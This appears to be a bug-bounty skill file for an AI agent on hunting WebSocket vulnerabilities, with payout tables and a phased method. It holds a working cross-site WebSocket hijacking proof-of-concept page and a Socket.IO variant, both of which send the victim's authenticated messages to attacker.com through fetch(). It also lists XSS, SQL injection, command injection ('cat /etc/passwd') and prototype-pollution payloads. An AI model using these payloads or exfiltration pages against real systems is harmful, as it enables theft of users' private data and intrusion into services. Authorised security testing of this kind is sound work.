---
name: hunt-websocket
description: Hunt WebSocket security vulnerabilities — cross-site WebSocket hijacking (CSWSH) due to missing origin validation, authentication bypass on upgrade handshake, message-level injection (XSS, SQLi, command injection via WS messages), IDOR via unvalidated roomId or channelId, replay attacks on signed messages, business logic abuse through out-of-order messages, and DoS via connection flood or oversized frames. Use when the target has real-time features — chat, notifications, dashboards, trading, gaming, or live collaboration. High payout when CSWSH exfils authenticated data. Keywords: websocket, ws, wss, socket.io, upgrade, handshake, STOMP, SockJS, SignalR.
sources: hackerone_public, portswigger_research
report_count: 19
---

# HUNT-WEBSOCKET — Hijacking, Injection & Authorization Bypass

## Crown Jewel Targets

| Feature type | Attack vector | Payout range |
|---|---|---|
| Real-time chat/messaging | CSWSH → read all messages | $2k–$15k |
| Financial dashboards (trading, crypto) | IDOR on feeds, price manipulation | $3k–$20k |
| Live collaboration (docs, whiteboards) | Inject content as other user | $2k–$10k |
| Notifications / event streams | CSWSH → private event exfil | $1k–$8k |
| IoT / device control panels | Command injection via WS | $5k–$30k |

Any WebSocket that carries authenticated data without validating the Origin header is a CSWSH candidate.

---

## Attack Surface Signals

**Browser DevTools Network tab — look for:**
- Requests with type `websocket` or status 101 (Switching Protocols)
- Headers: `Upgrade: websocket`, `Connection: Upgrade`

**URL patterns:**
```
wss://target.com/ws
wss://target.com/socket.io/?transport=websocket
wss://target.com/stomp
wss://target.com/cable       (Rails ActionCable)
wss://target.com/sockjs/...  (SockJS)
wss://target.com/signalr/...
```

**JavaScript signals:**
```javascript
new WebSocket("wss://...")
io("wss://...", {...})       // Socket.IO
Stomp.over(socket)          // STOMP over WS
ActionCable.createConsumer  // Rails
HubConnection               // SignalR
```

**Check if auth is in URL vs headers:**
```
wss://target.com/ws?token=eyJ...  ← token in query string (leaks to logs)
wss://target.com/ws?session_id=abc
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Capture WS traffic in Burp

1. Enable Burp's WebSockets history: Proxy → WebSockets history
2. Interact with the real-time feature (send a message, refresh a dashboard)
3. Capture: the upgrade request (HTTP), then the WS frames
4. Note: what authentication is in the upgrade request? Cookie? `Authorization` header? Token in URL?

### Phase 2 — Cross-site WebSocket hijacking (CSWSH)

**Condition:** WebSocket auth relies solely on cookies (no CSRF token, no Origin check)

**Test Origin validation:**
1. In Burp, intercept the WS upgrade request
2. Change the `Origin` header to `https://attacker.com`
3. If the connection upgrades successfully → Origin not validated → CSWSH possible

**Proof of concept HTML** (host on attacker.com):
```html
<!DOCTYPE html>
<html>
<body>
<script>
const ws = new WebSocket("wss://target.com/ws");

ws.onopen = () => {
  // Request whatever authenticated data the victim has access to
  ws.send(JSON.stringify({type: "subscribe", channel: "user_notifications"}));
  ws.send(JSON.stringify({type: "get_history", limit: 50}));
};

ws.onmessage = (event) => {
  // Exfil to attacker server
  fetch("https://attacker.com/exfil?d=" + encodeURIComponent(event.data));
};
</script>
Waiting... (data is being sent to attacker)
</body>
</html>
```

When victim visits attacker.com while authenticated to target.com, their browser opens the WS connection with their cookies attached.

**For Socket.IO:**
```html
<script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
<script>
const socket = io("https://target.com", {withCredentials: true});
socket.on("message", data => fetch("https://attacker.com/?d=" + JSON.stringify(data)));
socket.on("notification", data => fetch("https://attacker.com/?n=" + JSON.stringify(data)));
</script>
```

### Phase 3 — Authentication bypass on upgrade

1. Remove the auth cookie from the upgrade request (test unauthenticated WS)
2. Use an expired/invalid token in the URL param
3. Try upgrading with another user's session token
4. After authenticating as user A, try sending messages with user B's user ID in the message body

```bash
# Test unauthenticated WS with wscat
wscat -c wss://target.com/ws
# If connection opens without auth → any user can subscribe to any channel
```

### Phase 4 — IDOR via room/channel/resource IDs

After connecting, try subscribing to other users' channels:

```json
{"type": "subscribe", "channel": "user_123_notifications"}  // replace 123 with victim ID
{"action": "join_room", "room_id": "order_98765"}  // another user's order room
{"cmd": "watch", "resource": "account_456_activity"}
```

Also test: sending messages as another user by changing `sender_id` in the message body.

### Phase 5 — Message-level injection

WebSocket messages are often deserialized and processed server-side — test injection in every field:

**XSS via WS message (stored):**
```json
{"type": "chat", "message": "<img src=x onerror=alert(document.cookie)>", "room": "general"}
```

**SQL injection in search/filter:**
```json
{"type": "search", "query": "' OR '1'='1", "channel": "messages"}
{"type": "filter", "status": "' UNION SELECT password FROM users--"}
```

**Command injection (IoT/terminal apps):**
```json
{"type": "exec", "command": "ls; id"}
{"action": "ping", "host": "127.0.0.1; cat /etc/passwd"}
```

**Prototype pollution (Node.js apps):**
```json
{"__proto__": {"admin": true}, "type": "update_settings"}
```

### Phase 6 — Replay attacks

1. Capture a valid signed WS message (e.g., a payment action, vote, or admin command)
2. Replay the exact message body after it should have expired
3. If accepted again → no replay protection

Also: capture a message while connected as user A, replay it in user B's session.

### Phase 7 — Business logic via out-of-order messages

For stateful protocols (game servers, order flows, trading):

1. Capture the normal message sequence (connect → subscribe → action)
2. Send action messages before completing prerequisite steps
3. Send high-frequency messages (skip rate limiting at WS layer)

```
Normal: connect → authenticate → verify_balance → place_order
Attack: connect → place_order (skip balance check)
```

### Phase 8 — Token leakage in URL

If auth token is in the WebSocket URL query string:
```
wss://target.com/ws?token=SECRET_JWT
```

This leaks to:
- Browser history
- Server access logs
- Referer headers when navigating from the page
- Proxy logs

Report as "Sensitive token exposed in URL" even if you can't exploit further.

---

## Automation

```bash
# wscat — manual WS testing
npm install -g wscat
wscat -c wss://target.com/ws -H "Cookie: session=..."

# websocat — pipe-friendly WS client
websocat wss://target.com/ws

# CSWSH scanner — check Origin header validation
python3 cswsh_scanner.py -u wss://target.com/ws

# Burp Pro — WS-specific scanner
# Enable: Scanner → WS scanning options

# Socket.IO test
node -e "
const io = require('socket.io-client');
const s = io('https://target.com', {extraHeaders: {Cookie: 'session=COOKIE'}});
s.onAny((ev,data) => console.log(ev, JSON.stringify(data)));
"

# Check if Socket.IO exposes polling fallback (may bypass WS auth)
curl "https://target.com/socket.io/?EIO=4&transport=polling"
```

---

## Chain Table

| Finding | Chain to | Impact |
|---|---|---|
| CSWSH (Origin bypass) | Exfil all authenticated WS data | High–Critical |
| CSWSH + send capability | Send messages as victim | Critical |
| IDOR on channel subscribe | Victim's private event stream | High |
| XSS via WS message | Stored XSS → ATO | High–Critical |
| SQL injection in WS message | Database dump | Critical |
| Unauthenticated WS | Any authenticated action without auth | Critical |
| Token in URL | Credential harvest from logs | Medium |

---

## Validation

✅ **Confirmed CSWSH:** Attacker origin PoC page receives victim's WS messages in the exfil endpoint

✅ **Confirmed IDOR:** Subscribing to other user's channel returns their private events

✅ **Confirmed injection:** XSS payload renders in another user's browser from WS message

✅ **Confirmed auth bypass:** WS connection upgrades without valid auth credentials

### Severity assessment

| Scenario | CVSS | Typical payout |
|---|---|---|
| CSWSH exfil (all user data) | High 8.1 | $2k–$10k |
| CSWSH + write (send as victim) | Critical 9.1 | $5k–$20k |
| SQL injection via WS | Critical 9.8 | $10k–$40k |
| Command injection via WS | Critical 9.8 | $10k–$50k |
| IDOR on real-time stream | High 7.5 | $1k–$8k |

### Related skills

Cross-reference: `hunt-csrf` (CSWSH is WS-specific CSRF), `hunt-xss` (for WS-delivered stored XSS), `hunt-idor` (for channel/room ID enumeration).
